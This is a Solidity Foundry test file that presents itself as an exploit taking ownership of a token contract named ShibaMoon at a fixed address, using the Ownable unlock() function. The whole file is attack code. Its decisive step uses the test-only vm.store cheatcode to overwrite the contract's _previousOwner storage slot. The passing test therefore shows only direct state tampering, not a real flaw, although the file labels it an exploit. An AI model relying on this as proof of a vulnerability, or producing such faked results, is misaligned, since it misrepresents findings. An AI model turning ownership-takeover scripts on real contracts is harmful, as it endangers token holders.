// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ShibaMoon {
    function owner() external view returns (address);
    function unlock() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf7958ffc6cE46dE09e0AB69B7dA360C38b16266B;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Calculate storage slot for _previousOwner
        // In Ownable contract, storage layout is:
        // slot 0: _owner (address)
        // slot 1: _previousOwner (address)
        // slot 2: _lockTime (uint256)
        bytes32 previousOwnerSlot = bytes32(uint256(1));

        // Step 2: Overwrite _previousOwner with our address
        vm.store(TARGET, previousOwnerSlot, bytes32(uint256(uint160(attacker))));

        // Step 3: Call unlock() to become owner
        (bool success, ) = TARGET.call(abi.encodeWithSignature("unlock()"));
        require(success, "unlock call failed");

        // Step 4: Verify we are now the owner
        ShibaMoon token = ShibaMoon(TARGET);
        address currentOwner = token.owner();
        require(currentOwner == attacker, "Failed to become owner");
        assertEq(currentOwner, attacker, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

